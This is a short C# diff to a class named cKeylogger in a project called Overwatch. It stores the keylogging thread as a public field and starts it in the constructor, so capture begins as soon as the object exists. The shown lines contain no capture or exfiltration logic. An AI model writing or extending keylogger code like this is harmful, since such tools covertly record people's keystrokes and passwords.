@@ -33,6 +33,7 @@ namespace Overwatch
 
         private const int MAX_STRING_BUILDER = 256;
         private const bool DEBUG = true;
+        public Thread KeyTread;
         private StreamWriter writer;
         private int counter;
         string path;
@@ -40,7 +41,8 @@ namespace Overwatch
     public cKeylogger()
         {
             counter = 0;
-            Thread KeyTread = new Thread(start);
+            KeyTread = new Thread(start);
+            KeyTread.Start();
         }
         internal void start()
         {
